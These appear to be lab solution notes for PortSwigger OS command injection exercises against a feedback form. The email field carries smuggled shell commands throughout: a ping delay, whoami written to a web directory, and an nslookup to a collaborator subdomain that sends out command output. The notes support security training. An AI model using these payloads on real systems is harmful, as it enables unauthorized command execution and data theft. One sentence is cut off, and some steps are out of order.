1. Capture the request POST /feedback/submit
2. Prepend the string "||ping -c 10 127.0.0.1||" before the value of email parameter in the body of the request. The body of request now looks like this:
```
name=test&email=||ping -c 10 127.0.0.1||test%40gmail.com&subject=test&message=test
```
3. || is the logical OR operator. The ```ping -c 10 127.0.0.1``` command will execute if its previous command fail, which is the case since the value of email is invalid.

Url:https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
```
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```
Use Burp Suite to intercept and modify the request that submits feedback.
Url: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

```
email=||whoami>/var/www/images/output.txt||
filename=output.txt
```
Use Burp Suite Professional to intercept and modify the request that submits feedback.
Go to the Collaborator tab.
Click "Copy to clipboard" to copy a unique Burp

Url: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
```
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```
